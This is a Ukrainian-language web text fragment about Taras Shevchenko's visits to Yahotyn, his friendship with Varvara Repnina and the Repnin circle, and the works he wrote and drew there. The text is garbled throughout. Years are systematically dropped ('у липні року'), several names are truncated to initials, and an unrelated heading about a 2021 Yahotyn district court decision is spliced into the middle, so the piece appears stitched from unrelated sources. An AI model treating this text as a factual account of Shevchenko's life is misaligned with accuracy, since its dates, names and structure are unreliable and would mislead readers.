	<p>Волконським М. Рєпнін після р. Освіченою і благородною людиною була і дочка Рєпніна — Варвара Миколаївна. Вона цікавилась історією та культурою рідного краю.</p><strong><a id='c3'></a><h2>Рішення № 93273539, 26.11.2021, Яготинський районний суд Київської області</h2></strong><p>Всі Рєпніни цікавились й прихильно ставилися до творчості Т. Шевченка, цінували його художню майстерність. Все це й сприяло перебуванню у них Великого Кобзаря. Шевченко приїздив до Яготина у супроводі колишнього декабриста О. Капніста, який познайомив поета з Рєпніними, а також кілька разів сам. У липні року він відвідав Яготин двічі, а з жовтня року по січень року жив у флігелі князівського палацу, стіни якого прикрасив власними малюнками, користувався бібліотекою Рєпніних, малював портрети, краєвиди та писав твори.</p>
<p>Рєпніна допомагала поетові, переписуючи його рукописи, перекладаючи іноземну літературу. У Рєпніних Шевченко читав свої твори «Слепая», «Катерина». Там він зустрічав чимало прихильників свого таланту, людей передових поглядів, освічених і обдарованих. Це — сестри Псьол — художниця і поетеса, P.</p>
<p>Штрандман, журналіст за професією, пізніше член антикріпосницького гуртка петрашевців, лікар М. Фішер та ін. Цікавою була дружба Т. Шевченка з маляром і дяком Н. Поет часто бував у родині Філянських. З Філянськими Шевченко дискутував на різні теми, після чого часто виходив з ними на вигін над Іржавцем і разом з кріпаками співали народних пісень. Перебування Т. Шевченка в Яготині позитивно вплинуло на розвиток творчості поета.</p>
<p>Тут Великий Кобзар записав народну пісню «Соколе мій, чоловіче», написав поему «Тризна», яку присвятив В. З мистецьких творів Т. Шевченка, виконаних у Яготині, відомі дві копії портрета М. Рєпніна, портрет дітей князя, а також автопортрет, подарований В. Часто зупинявся поет в Яготині і під час своєї подорожі по Україні в році, яка закінчилася його арештом і засланням.</p>
<p>Шевченко з далекого заслання до В. Рєпніної у березні року. В роки тяжких для поета випробувань яготинські друзі не забули його. Рєпніна, сестри Псьол підтримували поета морально, писали йому листи, надсилали книги. Щирий друг поета В. Рєпніна клопотала про полегшення долі Шевченка, зверталася навіть до шефа жандармів графа Орлова.</p>
<p>Одержавши волю й подорожуючи в році Полтавщиною і Київщиною, Т. Шевченко прибув у Яготин і зупинився у Філянського.</p>
		
			
